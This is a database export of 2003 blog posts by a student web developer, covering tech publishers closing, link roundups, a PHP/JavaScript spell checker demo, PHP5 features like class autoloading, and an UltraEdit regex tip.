	<row>
		<field name="id">820</field>
		<field name="title">Wrox and glasshaus go under</field>
		<field name="slug">wroxAndGlasshausGoUnder</field>
		<field name="body">&lt;p&gt;It looks like there's a shakedown going on in technical book publishing land. Glasshaus &lt;a href=&quot;http://www.glasshaus.com/&quot; title=&quot;glasshaus site&quot;&gt;are no more&lt;/a&gt;, and (so far unsubstantiated) rumours are &lt;a href=&quot;http://postneo.com/2003/03/14.html#a2217&quot;&gt;flying round&lt;/a&gt; that &lt;a href=&quot;http://www.wrox.com/&quot;&gt;Wrox&lt;/a&gt; are going bust / have gone bust as well.&lt;/p&gt;

&lt;p&gt;I've got a few Wrox books lying around but I have to admit I never liked them nearly as much as my O'Reilly collection (although &lt;a href=&quot;http://www.amazon.com/exec/obidos/ASIN/1861002238/&quot;&gt;Beginning Java 2&lt;/a&gt; is still the book I recommend to anyone who wants to learn that language). I've heard they are very good for &lt;acronym title=&quot;Active Server Pages&quot;&gt;ASP&lt;/acronym&gt; and .NET related content though. If Wrox really have gone under it will have a pretty dramatic impact on the amount and variety of my local tech bookshops (not too mention a lot less red). My only experience with glasshaus has been their &lt;a href=&quot;http://www.glasshaus.com/bookInfo.asp?bookId=59&quot;&gt;Cascading Style Sheets book&lt;/a&gt;, which is absolutely excellent. In fact, if you have any interest in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and haven't picked up a copy yet I suggest doing so now before it becomes too rare a commodity. I've got my eye on a few other glasshaus titles though - their policy of covering &quot;leading edge&quot; web techniques (Accessibility, Usability, CSS, Web Database design) made them an interesting small scale publisher - plus they also seemed to hire a lot of their authors from mailing lists I occasionally frequent such as &lt;a href=&quot;http://www.evolt.org/&quot;&gt;Evolt&lt;/a&gt; and &lt;a href=&quot;http://www.webdesign-l.com/&quot;&gt;Webdesign-L&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I wonder what happens to the copyright of a book once the publisher goes under? Does it end up in some kind of limbo, eternally awaiting the day when someone &quot;buys&quot; it from the liquidator or does ownership revert back to the author? If the latter is true, we may see other authors following &lt;a href=&quot;http://effbot.org/zone/librarybook-index.htm&quot; title=&quot;(the eff-bot guide to) The Standard Python Library (Redux)&quot;&gt;the lead of Frederick Lundh&lt;/a&gt; in publishing their work online and/or charging a small fee for a downloadable version.&lt;/p&gt;

&lt;p&gt;Incidentally, a &lt;a href=&quot;http://www.feedster.com/search.php?q=wrox&quot;&gt;search for wrox&lt;/a&gt; on Scott Johnson's Feedster is currently a great way of seeing what people are saying. It's a shame Feedster doesn't support some kind of permalink-to-these-search-results feature for letting bloggers link to the search results as a useful overview of the blogosphere's opinion on something on a specific date.&lt;/p&gt;</field>
		<field name="created">2003-03-16 04:34:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">821</field>
		<field name="title">Clearing out my tabs</field>
		<field name="slug">clearingOutMyTabs</field>
		<field name="body">&lt;p&gt;I've inadvertantly discovered a flaw in the tabbed browsing model - if you're not disciplined about them you can quickly end up lost in a see of tabs. Right now I have 6 Phoenix windows open with a total of 57 tabs between them. This is the result of about a week's accumulated browsing, leaving me unable to even think about shutting down or rebooting my computer without clearing them all out first. The fact that Mandrake is churning along happily without any noticable slowdown (despite me having several other applications running as well) doesn't help at all as it gives me even less impetus to tidy everything up.&lt;/p&gt;

&lt;p&gt;This post exists mainly to clear out interesting tabs.&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.doxdesk.com/pxtl/&quot;&gt;PXTL&lt;/a&gt; -  the Python XML Templating Language - a proposal and specification in progress (by Andrew Clover).&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://boards.straightdope.com/sdmb/showthread.php?threadid=160851&amp;amp;perpage=1&amp;amp;pagenumber=1&quot;&gt;The horror of blimps&lt;/a&gt; - file under &quot;funny&quot;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.costik.com/weblog/2003_03_01_blogchive.html#90490621&quot;&gt;A Specter is Haunting Gaming&lt;/a&gt; - the games industry is suffering from extreme lack of innovation.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.sitepoint.com/article/910/&quot;&gt;mod_rewrite: A Beginner's Guide to URL Rewriting&lt;/a&gt; - SitePoint's invaluable guide to the hideously complicated (but awesomely powerful) mod_rewrite Apache module.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.readinged.com/onyx/rss/&quot;&gt;Onyx RSS&lt;/a&gt; - ReadingEd's &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; parser.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.php-tools.de/site.php&quot;&gt;PHP Application Tools&lt;/a&gt; - a whole bunch of useful looking object oriented &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; scripts, including template and &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; rendering libraries.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://w-uh.com/index.cgi/articles/030308-tyranny_of_email.html&quot;&gt;The Tyranny of Email&lt;/a&gt; - advice on preventing email from killing your productivity.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_03_09_archive.shtml#90720771&quot;&gt;Craig Saila praises Macromedia&lt;/a&gt; for actively responding to feedback from their controversial &lt;a href=&quot;http://news.com.com/2100-1046-991868.html&quot; title=&quot;Revamped Macromedia site irks customers&quot;&gt;new redesign&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.joelonsoftware.com/articles/BuildingCommunitieswithSo.html&quot;&gt;Building Communities with Software&lt;/a&gt; - Joel explains the design decisions behind his site's forum software, and points out that as in real life it's the small details of community software that influence the kind of community that develops there.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.sitepoint.com/newsletter/viewissue.php?id=3&amp;amp;issue=60#6&quot;&gt;SitePoint Newsletter Quick Tip&lt;/a&gt; describing a method for highlighting links that will open in a new window using a custom user stylesheet.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.mozilla.org/browser-innovation.html&quot;&gt;Browser Innovation, Gecko and the Mozilla Project&lt;/a&gt; - Mitchell Baker's essay, as linked to by the rest of the blogging world.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://advogato.org/article/545.html&quot;&gt;Advogato virus&lt;/a&gt; - the first &quot;virus&quot; I've ever seen that spreads itself around within a site-with-login-system using embedded hostile javascript.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.guardian.co.uk/online/story/0,3605,907960,00.html&quot;&gt;A blogger is a stalker's dream&lt;/a&gt; - good title, but basically a rant about dull my-life-sucks style blogs.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.imagemagick.com/www/convert.html&quot;&gt;ImageMagick convert documentation&lt;/a&gt; for command line conversion of images.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.evolt.org/article/PHP_frontend_to_ImageMagick/17/55650/index.html&quot;&gt;PHP frontend to ImageMagick&lt;/a&gt; - the reason I was reading the above.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://devedge.netscape.com/viewsource/2003/arbitrary-hover/&quot;&gt;Issues Arising From Arbitrary-Element Hover&lt;/a&gt; - I was hoping this article would cover sites that set a hover style for all a elements and forget to close their &lt;code&gt;&amp;lt;a name=&quot;something&quot;&amp;gt;&lt;/code&gt; elements (resulting in most of the text on the page changing colour on hover) but it didn't.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I really need to get myself a linkroll.&lt;/p&gt;</field>
		<field name="created">2003-03-16 05:13:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">822</field>
		<field name="title">The onion gets it spot on</field>
		<field name="slug">theOnionGetsItSpotOn</field>
		<field name="body">&lt;p&gt;Okay, now I have absolutely no intention of taking this blog in a political direction (for the record I'm anti-war) but I've seen a couple of links to &lt;a href=&quot;http://www.theonion.com/&quot;&gt;the Onion&lt;/a&gt; recently that I just can't resist blogging. First up is &lt;a href=&quot;http://www.theonion.com/onion3701/bush_nightmare.html&quot;&gt;Bush: &quot;Our Long National Nightmare of Peace and Propserity is Finally Over&quot;&lt;/a&gt; which was written two years ago but, read now, just looks spookily accurate (link &lt;a href=&quot;http://www.back-to-iraq.com/archives/000286.php#000286&quot; title=&quot;Back to the Future&quot;&gt;via Back-to-Iraq&lt;/a&gt;). The second one is the absolute classic &lt;a href=&quot;http://www.theonion.com/onion3734/god_clarifies_dont_kill.html&quot;&gt;God Angrily Clarifies &quot;Don't Kill&quot; Rule&lt;/a&gt;, linked &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000645.html#000645&quot; title=&quot;It&amp;apos;s a question of when, not if&quot;&gt;by Simon Brunning&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-03-17 23:49:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">823</field>
		<field name="title">Flash Functionality not quite so flash</field>
		<field name="slug">flashFUnctionalityNotSoFlash</field>
		<field name="body">&lt;p&gt;What Do I Know &lt;a href=&quot;http://whatdoiknow.org/archives/000829.php&quot; title=&quot;Macromedia.com Progress Report&quot;&gt;points to&lt;/a&gt; Macromedia's &lt;a href=&quot;http://www.macromedia.com/special/progress_report/&quot; title=&quot;Macromedia.com Progress Report: Beta One&quot;&gt;progress report&lt;/a&gt; explaining how thy have been responding to feedback on their recent site redesign.  Todd Dominey makes the following insightful observation:&lt;/p&gt;

&lt;blockquote cite=&quot;http://whatdoiknow.org/archives/000829.php&quot;&gt;&lt;p&gt;Perhaps most interesting, to me anyhow, was the crossroad of choosing which tool to use to solve a particular navigational problem, and the internal politics that likely surrounded their decision making. Case in point - the drop down option boxes on their index page. In Beta 1, the forms were created in Flash MX. In Beta 2, they have been completely replaced by tried and true, raw HTML option forms.&lt;/p&gt;

&lt;p&gt;The Flash versions were styled nicely, with radius corners and a fancy diagonal light bevel, and some pretty nice interactivity. But did they solve any particular problem that a standard html form couldn’t handle? The answer was, and is, no. Sure, they looked nice, and were a good showcase of what you can do with Flash, but were they worth the extra bandwidth, page weight, and development time? Apparently not. They have been completely removed and replaced with much more familiar, lighter, and easier to update standard option boxes.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2003-03-17 23:55:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">824</field>
		<field name="title">PHP and Javascript spell checker</field>
		<field name="slug">phpAndJavascriptSpellChecker</field>
		<field name="body">&lt;p&gt;Last week I &lt;a href=&quot;http://simon.incutio.com/archive/2003/03/08/#spellCheckInWebApplications&quot;&gt;commented&lt;/a&gt; that &lt;a href=&quot;http://www.intertwingly.net/blog/1247.html&quot;&gt;Sam Ruby's spell checking feature&lt;/a&gt; could be made even funkier with the addition of a javascript powered &quot;corrections&quot; menu. I spent a few hours this afternoon playing with the idea, and I've now got quite a nice proof of concept:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://simon.incutio.com/demos/spellcheck/&quot;&gt;Spell Checker Demo&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I've tested it on Phoenix and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;5 on Windows - I'll check it on &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6 later on this evening. &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;5 gets the menus in the wrong place but other than that it seems to work fine in both browsers. I adapted Sam's &lt;a href=&quot;http://www.intertwingly.net/code/spellcheck.py&quot; title=&quot;spellcheck.py&quot;&gt;Python code&lt;/a&gt; for &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; on the server side, while the client side bit is a whole lot of messing around with the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;.&lt;/p&gt;

&lt;p&gt;If you want to nose around the source code, take a look at this lot:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;/demos/spellcheck/SpellChecker.class.php.txt&quot;&gt;SpellChecker.class.php&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;/demos/spellcheck/index.php.txt&quot;&gt;index.php&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;/demos/spellcheck/speling.js&quot;&gt;speling.js&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There are still a few bugs, and I haven't quite worked out an elegant way to get the menus to behave more like menus, but on the whole it's worked out pretty well.&lt;/p&gt;</field>
		<field name="created">2003-03-18 21:50:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">825</field>
		<field name="title">Great new bookmarklets</field>
		<field name="slug">greatNewBookmarklets</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.zeldman.com/daily/0203c.shtml#showdiv&quot; title=&quot;A tool to view the structure of web pages&quot;&gt;Via Zeldman&lt;/a&gt;, Ian Lloyd (who has recently &lt;a href=&quot;http://www.ian-lloyd.com/&quot;&gt;re-launched his personal blog&lt;/a&gt;) has released a pair of invaluable bookmarklets for dissecting the structure of properly marked up pages: &lt;a href=&quot;http://www.accessify.com/tools-and-wizards/accessibility-checking-favelets.asp&quot; title=&quot;Accessibility Checking Favelets&quot;&gt;Show and label divs with ids and Show and label divs with classes&lt;/a&gt;. Combine with Liorean's &lt;a href=&quot;http://liorean.web-graphics.com/&quot;&gt;ViewStyles and ViewScripts&lt;/a&gt; for best effect.&lt;/p&gt;</field>
		<field name="created">2003-03-18 23:35:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">826</field>
		<field name="title">mod_psp</field>
		<field name="slug">modPsp</field>
		<field name="body">&lt;p&gt;Sterling Hughes (recently blogrolled) has been &lt;a href=&quot;http://www.edwardbear.org/blog/archives/000108.html&quot; title=&quot;mod_psp and Python Server Pages&quot;&gt;working on mod_psp&lt;/a&gt;, a Python Server Pages module for Apache. He's up to &lt;a href=&quot;http://www.edwardbear.org/blog/archives/000111.html&quot; title=&quot;First Application and 0.2.1&quot;&gt;version 0.2.1&lt;/a&gt; already. &lt;a href=&quot;http://www.kryogenix.org/&quot;&gt;Stuart&lt;/a&gt; once told me that the toughest problem when embedding Python code in &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; is figuring out how to deal with indentation blocks - PSP appears to handle this by letting the indentation &quot;leak&quot; in to the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;, which seems a bit of an ugly workaround. Still, if the module ends up being any where near as straight forward to install and use as &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; it could become a very useful tool.&lt;/p&gt;</field>
		<field name="created">2003-03-18 23:44:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">827</field>
		<field name="title">Haunted by old hacks</field>
		<field name="slug">hauntedByOldHacks</field>
		<field name="body">&lt;p&gt;Paul Hammond is &lt;a href=&quot;http://www.paranoidfish.org/notes/2003/03/17/1845&quot; title=&quot;On Marking up Code Blocks&quot;&gt;seeking the perfect way&lt;/a&gt; of marking up code snippets. He examines several methods, including this interesting specimen:&lt;/p&gt;

&lt;blockquote cite=&quot;&quot;&gt;&lt;p&gt;
&lt;strong&gt;&lt;code&gt;&amp;lt;ol class=&quot;codeListing&quot;&amp;gt; &amp;lt;li&amp;gt;&amp;lt;code&amp;gt;…&amp;lt;/code&amp;gt;&amp;lt;/li&amp;gt; … &amp;lt;/ol&amp;gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;As seen on &lt;a href=&quot;http://css-discuss.incutio.com/?page=EditingTips&quot;&gt;the css-discuss wiki&lt;/a&gt;.  This method is just wierd&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It's nice to have an old hack recognised :) The css-discuss wiki technique is something I &lt;a href=&quot;http://simon.incutio.com/demos/css/numbered-code-listings.html&quot; title=&quot;Numbered Code Listing Experiment&quot;&gt;put together last July&lt;/a&gt; as an experiment in the most semantic way of marking up code so as to get line numbers - as an ordered list. It's pretty bizzare but it achieves the desired effect. These days my preferred method of marking up code is to use a &amp;lt;code&amp;gt; element nested inside a &amp;lt;pre&amp;gt;.&lt;/p&gt;
</field>
		<field name="created">2003-03-18 23:54:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">828</field>
		<field name="title">Javascript prototypes</field>
		<field name="slug">javascriptPrototypes</field>
		<field name="body">&lt;p&gt;Andrew Hayward (a friend from Uni who has recently started blogging) has been &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/03/18/Null#comments&quot; title=&quot;Null&quot;&gt;playing with javascript's prototypes&lt;/a&gt;. &lt;code&gt;prototype&lt;/code&gt; is a value related to a particular class from which all instances of that class are created - only in javascript classes are actually functions... and then it all gets really complicated.&lt;/p&gt;

&lt;p&gt;Anyway, Andy's experiments concern using the prototype property to add new methods to javascript's &lt;em&gt;built in&lt;/em&gt; classes such as String, Array and even Object. He uses this trick to add useful methods such as &lt;code&gt;String.trim()&lt;/code&gt;, &lt;code&gt;Array.implode()&lt;/code&gt; and &lt;code&gt;Object.dump()&lt;/code&gt;. It looks remarkably useful both for debugging and for making javascript do more stuff in less lines of code by adding additional layers of abstraction to the core language.&lt;/p&gt;

&lt;p&gt;We've been looking at javascript in our &quot;Concepts of Programming Languages&quot; course this semester and it's proving a much more interesting language than I had originally thought.&lt;/p&gt;</field>
		<field name="created">2003-03-19 03:48:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">829</field>
		<field name="title">Dithered DOM scripts</field>
		<field name="slug">ditheredDomScripts</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.dithered.com/javascript/dom.html&quot;&gt;Dithered.com's DOM Scripts&lt;/a&gt; follow an interesting philosophy:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.dithered.com/javascript/dom.html&quot;&gt;&lt;p&gt;
One thing that always bothered me about DHTML APIs in particular is that you introduce a whole set of non-standard properties and methods in order to deal with the fact that not all browsers implement the standard properties and methods. You should attempt to preserve a standard as best you can. For instance, in order to get a reference to an element, the standard defines document.getElementById(). For systems that don't support this method, you could create a method of the document object with the name getElementById that mimics the standard behaviour. That way, you aren't married to a non-standard API and won't be screwed when the developer stops supporting it or a new browser introduces something that breaks the API.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-03-19 23:52:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">830</field>
		<field name="title">Useful python resources</field>
		<field name="slug">pythonResources</field>
		<field name="body">&lt;p&gt;A bunch of useful Python resources:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.myelin.co.nz/post/2003/3/13/#200303135&quot;&gt;How to fork and return text from the child process&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000652.html#000652&quot;&gt;Driving win32 GUIs with Python, part 1&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://lists.osafoundation.org/pipermail/dev/2003-March/000479.html&quot;&gt;Python Coding Standards&lt;/a&gt; from Yahoo's eGroups system&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.zope.org/Members/Brian/PythonNet/&quot;&gt;Python Scripting for .NET&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://bitworking.org/news/57&quot;&gt;Converting XML Nodes into a Dictionary in Python using SAX&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And &lt;a href=&quot;http://www.jasc.com/pbeta/psp/readme.asp#_Scripting&quot;&gt;via Kevin Altis&lt;/a&gt;, Paint Shop Pro 8 features Python as &lt;a href=&quot;http://www.jasc.com/pbeta/psp/readme.asp#_Scripting&quot;&gt;an embedded scripting language&lt;/a&gt;.&lt;/p&gt;
</field>
		<field name="created">2003-03-19 23:57:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">831</field>
		<field name="title">Some PHP notes</field>
		<field name="slug">phpNotes</field>
		<field name="body">&lt;p&gt;I ran an intermediate to advanced &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; session at University today, on behalf of &lt;a href=&quot;http://www.bcss.info/&quot;&gt;BCSS&lt;/a&gt;. The turn out wasn't particularly impressive, probably because the only lecture today had been cancelled so there were a lot fewer people from our course on campus than I had expected (the session was arranged because a piece of group coursework we are working on at the moment uses PHP). The notes I put together from the course are &lt;a href=&quot;http://www.bcss.info/courses/phpdropin/&quot; title=&quot;PHP drop-in notes&quot;&gt;available online&lt;/a&gt;. They were put together in a bit of a hurry, so please tell me if you spot any mistakes. Topics covered include &lt;a href=&quot;http://www.bcss.info/courses/phpdropin/notes/cookies&quot;&gt;sessions and cookies&lt;/a&gt;, &lt;a href=&quot;http://www.bcss.info/courses/phpdropin/notes/objects&quot;&gt;classes and objects&lt;/a&gt;, &lt;a href=&quot;http://www.bcss.info/courses/phpdropin/notes/references&quot;&gt;references&lt;/a&gt; and some brief notes on &lt;a href=&quot;http://www.bcss.info/courses/phpdropin/notes/security&quot;&gt;writing secure code&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-03-21 23:39:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">832</field>
		<field name="title">Conference woes</field>
		<field name="slug">conferenceWoes</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.kryogenix.org/days/448.html&quot; title=&quot;Python UK Conference 2003&quot;&gt;Like Stuart&lt;/a&gt;, I'm severely tempted by the &lt;a href=&quot;http://www.shiningrose.co.uk/pyuk/&quot;&gt;UK Python conference&lt;/a&gt; - as a student it would cost me £85 to go for the first day, not including train fairs. That's a lot of money (considering I currently have none) for 4 sessions and the opportunity of a &lt;acronym title=&quot;Birds Of a Feather&quot;&gt;BOF&lt;/acronym&gt; meeting, but it's quite rare for the UK to host a conference on something I'm heavily interested in (I'm yet to go to one). These &lt;a href=&quot;http://www.uiweb.com/issues/issue24.htm&quot;&gt;tips on getting the most out of a conference&lt;/a&gt; would certainly come in handy.&lt;/p&gt;

&lt;p&gt;Then again, I need to save up £100 for a &lt;a href=&quot;http://www.glastonburyfestivals.co.uk/&quot;&gt;Glastonbury ticket&lt;/a&gt; so it doesn't look like there's a chance of me scraping together the dough for both. Aah well.&lt;/p&gt;</field>
		<field name="created">2003-03-21 23:45:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">833</field>
		<field name="title">coWiki uses PHP5</field>
		<field name="slug">coWikiUsesPHP5</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://develnet.org/&quot;&gt;coWiki&lt;/a&gt; is the first open source project I have seen being developed with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5, using snapshots from &lt;acronym title=&quot;Concurrent Versioning System&quot;&gt;CVS&lt;/acronym&gt;. It looks like a really neat wiki system. Of particular interest for &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; heads is the development log on the &lt;a href=&quot;http://develnet.org/&quot;&gt;front page&lt;/a&gt; (sorry, no permalinks) which provides some insight in to the progress of &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5's development.&lt;/p&gt;</field>
		<field name="created">2003-03-21 23:53:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">834</field>
		<field name="title">PHP5 info from Sterling Hughes</field>
		<field name="slug">php5InfoFromSterlingHughes</field>
		<field name="body">&lt;p&gt;Sterling Hughes has &lt;a href=&quot;http://ny1.php.net/talks/show.php/php5intro&quot; title=&quot;Introduction to PHP5: Slides&quot;&gt;posted the slides&lt;/a&gt; he will be using for &lt;a href=&quot;http://www.edwardbear.org/blog/archives/000119.html&quot; title=&quot;Introduction to PHP5: Blog entry&quot;&gt;his presentation&lt;/a&gt; on &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5 next week. They provide a great deal of insight in to the new additions to look forward to in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5, including a few I hadn't heard about before.&lt;/p&gt;

&lt;p&gt;One of the most instantly useful looking is &lt;a href=&quot;http://ny1.php.net/talks/show.php/php5intro/24&quot;&gt;Class Autoloading&lt;/a&gt;. By creating a function called &lt;code&gt;__autoload()&lt;/code&gt; you can add logic to automatically include a class the first time it is called. The example code explains this much better:&lt;/p&gt;

&lt;blockquote cite=&quot;http://ny1.php.net/talks/show.php/php5intro/24&quot;&gt;&lt;pre&gt;&lt;code&gt;
&amp;lt;?php
function __autoload($classname) {
    include_once(&quot;$classname.php&quot;);
}
$mono = new monkey;
$mono-&amp;gt;scratch();
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 5 will also feature support for &lt;a href=&quot;http://ny1.php.net/talks/show.php/php5intro/13&quot;&gt;class access control&lt;/a&gt;, &lt;a href=&quot;http://ny1.php.net/talks/show.php/php5intro/29&quot;&gt;interfaces&lt;/a&gt; and &lt;a href=&quot;http://ny1.php.net/talks/show.php/php5intro/31&quot;&gt;type hinting&lt;/a&gt; where a function or method can declare the type it expects for each of its arguments. It's sounding more and more like Java all the time, but seeing as all of the new support for stricter control are optional I don't see this as a disadvantage at all. Coders who want serious &lt;acronym title=&quot;Object Oriented Programming&quot;&gt;OOP&lt;/acronym&gt; can have it, while people knocking out a quick script don't need to worry about them at all.&lt;/p&gt;</field>
		<field name="created">2003-03-23 16:05:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">835</field>
		<field name="title">UltraEdit regular expressions</field>
		<field name="slug">ultraEditRegularExpressions</field>
		<field name="body">&lt;p&gt;Every now and then I find myself needing to use a regular expression in &lt;a href=&quot;http://www.ultraedit.com/&quot;&gt;UltraEdit&lt;/a&gt;, and whenever I do I invariably have to spend five minutes re-reading that section of the manual to remind myself how its syntax differs from more traditional regular expressions. This time, I'm recording the result in the hope that it might jog my memory next time I need to use them.&lt;/p&gt;

&lt;p&gt;The task completed by this regular expression is to turn a file containing numbers like this:&lt;/p&gt;

&lt;pre&gt;1st
2nd
3rd
...
&lt;/pre&gt;

&lt;p&gt;In to this:&lt;/p&gt;

&lt;pre&gt;&amp;lt;option value=&quot;1&quot;&amp;gt;1st&amp;lt;/option&amp;gt;
&amp;lt;option value=&quot;2&quot;&amp;gt;2nd&amp;lt;/option&amp;gt;
&amp;lt;option value=&quot;3&quot;&amp;gt;3rd&amp;lt;/option&amp;gt;&lt;/pre&gt;

&lt;p&gt;Find: &lt;code&gt;%^([0-9]+^)^(?+^)$&lt;/code&gt; and Replace with: &lt;code&gt;&amp;lt;option value=&quot;^1&quot;&amp;gt;^1^2&amp;lt;/option&amp;gt;&lt;/code&gt;&lt;/p&gt;</field>
		<field name="created">2003-03-23 16:12:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">836</field>
		<field name="title">Smart scripted URLs</field>
		<field name="slug">smartScriptedURLs</field>
		<field name="body">&lt;p&gt;Dan Kalowsky is &lt;a href=&quot;http://www.deadmime.org/~dank/archives/2003/03/23/Web%20URLs.html&quot; title=&quot;Web URLs&quot;&gt;realising&lt;/a&gt; the importance of using a smart scripting technique to generate &quot;nice&quot; &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt;s:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.deadmime.org/~dank/archives/2003/03/23/Web%20URLs.html&quot;&gt;&lt;p&gt;I'm starting to wonder why it's not really implemented in every area, considering the usefulness that this would provide not only to the common web surfing, but also to the corporate world and cutting down on costs for support.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-03-24 13:53:16</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">837</field>
		<field name="title">The goodness of binary search</field>
		<field name="slug">theGoodnessOfBinarySearch</field>
		<field name="body">&lt;p&gt;Tim Bray &lt;a href=&quot;http://tbray.org/ongoing/When/200x/2003/03/22/Binary&quot; title=&quot;On the Goodness of Binary Search&quot;&gt;provides&lt;/a&gt; an in depth, practical explanation of the binary search algorithm with example code in Java. Great revision material for second year computer scientists like myself.&lt;/p&gt;</field>
		<field name="created">2003-03-24 13:53:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">838</field>
		<field name="title">A PHP Installer</field>
		<field name="slug">aPHPInstaller</field>
		<field name="body">&lt;p&gt;Wez Furlong is &lt;a href=&quot;http://zlog.thebrainroom.net/archives/e_6.html&quot; title=&quot;A PHP Application Installer&quot;&gt;working on&lt;/a&gt; a generic &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; installation script. If he finds a nice solution to the safe_mode and open_basedir restrictions mentioned in his post this could be a hugely useful tool for the &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; community.&lt;/p&gt;</field>
		<field name="created">2003-03-24 13:54:55</field>
		<field name="comments_open">0</field>
	</row>

